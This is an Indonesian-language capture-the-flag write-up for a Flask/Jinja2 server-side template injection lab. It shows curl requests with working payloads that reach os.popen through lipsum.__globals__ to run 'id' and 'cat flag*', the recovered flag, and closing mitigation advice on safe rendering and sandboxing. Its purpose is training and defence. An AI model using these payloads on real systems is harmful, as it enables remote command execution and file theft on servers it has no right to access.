## Problem Statement & Scope
Aplikasi web berbasis Flask/Jinja2 menyediakan fitur pengumuman teks interaktif. Input pengguna yang dimasukkan melalui form dikirimkan ke endpoint `/announce` dan di-render langsung ke dalam template halaman. Peserta ditugaskan membuktikan keberadaan celah Server-Side Template Injection (SSTI) dan mengeksekusi perintah sistem untuk membaca berkas flag.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Mekanisme Server-Side Template Injection (SSTI):**
   Kerentanan SSTI terjadi ketika aplikasi menggabungkan input pengguna yang tidak disanitasi secara langsung ke dalam string template server (seperti Jinja2, Twig, atau Freemarker) sebelum fungsi kompilasi/render dijalankan (misalnya `render_template_string(template_str)` alih-alih `render_template('page.html', content=user_input)`).
2. **Eskalasi dari Template Context ke Remote Code Execution (RCE):**
   Dalam mesin template Jinja2 (Python), objek template memiliki akses ke hierarki objek internal Python (`Method Resolution Order` / MRO, `__globals__`, dan `__builtins__`). Penyerang dapat menavigasi objek bawaan seperti `lipsum` atau `cycler` untuk mengakses modul `os` dan fungsi eksekusi sistem `os.popen()`:
   ```jinja2
   {{ lipsum.__globals__['os'].popen('id').read() }}
   ```

## Rekonstruksi Eksploitasi Step-by-Step
1. Luncurkan instance lab web container:
   `PUT /api/challenges/492/instance/`
2. Identifikasi perilaku form pada URL target:
   - Form pada `/` mengirimkan input melalui metode POST ke `/announce`.
3. Lakukan pengujian awal injeksi ekspresi matematika:
   ```bash
   curl -s -X POST http://xebec.cylabacademy.net:27897/announce -d "content={{7*7}}"
   ```
   Respons server menghasilkan nilai evaluasi `49`:
   ```html
   <h1 style="font-size:100px;" align="center">49</h1>
   ```
   Hal ini membuktikan bahwa mesin template Jinja2 mengeksekusi ekspresi dinamis di sisi server.
4. Rancang payload eksfiltrasi berkas menggunakan navigasi global `lipsum`:
   ```bash
   curl -s -X POST http://xebec.cylabacademy.net:27897/announce \
        -d "content={{lipsum.__globals__['os'].popen('cat flag*').read()}}"
   ```
5. Server mengeksekusi perintah shell `cat flag*` dan mengembalikan isi flag pada elemen judul:
   ```html
   <h1 style="font-size:100px;" align="center">academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}</h1>
   ```

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Hindari Kompilasi Template Dinamis dari Input Mentah:** Jangan pernah menggunakan fungsi `render_template_string()` yang menggabungkan variabel pengguna langsung ke dalam sintaks template. Gunakan file template statis dengan parameter konteks yang terikat secara aman:
  ```python
  # Rentan:
  return render_template_string("<h1>" + user_input + "</h1>")

  # Aman:
  return render_template("index.html", content=user_input)
  ```
- **Penerapan Sandboxing Template Engine:** Jika sistem memang memerlukan fitur templating oleh pengguna akhir, aktifkan mode `SandboxedEnvironment` pada Jinja2 untuk membatasi akses ke atribut privat seperti `__globals__`, `__mro__`, dan `__subclasses__`.
